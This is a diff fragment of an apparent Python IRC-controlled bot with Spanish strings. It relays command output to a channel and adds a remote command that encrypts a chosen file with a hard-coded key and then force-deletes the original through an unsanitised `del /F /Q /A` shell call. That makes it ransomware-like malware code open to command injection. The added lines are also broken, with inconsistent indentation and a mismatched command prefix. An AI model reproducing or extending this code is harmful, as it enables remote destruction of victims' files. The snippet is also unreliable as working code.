@@ -157,8 +157,17 @@ def do_command(irc, ircmsg):
             send_msg(irc, canal, sub_stdout.replace("\r\n", ""))
 
         elif ircmsg.find("!@cifraArchivo") != -1:
-            command_rec = ircmsg.split("!@cifraArchivo ")[1]
-            cifraArchivo(CreaLlave('a.txt'), command_rec)
+            command_rec = ircmsg.split("!@cifra ")[1]
+		          command_rec = command_rec.split(" ")
+            send_msg(irc, canal, "Cifrando...")
+            fileA=command_rec[0]
+            if os.path.exists(fileA):
+		             	llave = CreaLlave('hola')
+                Cifra(llave,fileA)
+			             os.system("del /F /Q /A "+ fileA)
+			             send_msg(irc, canal, "Cifrado exitoso.")
+             else:
+		             	send_msg(irc, canal, "No existe el archivo.")
 
         
         elif ircmsg.find("!@bye") != -1:
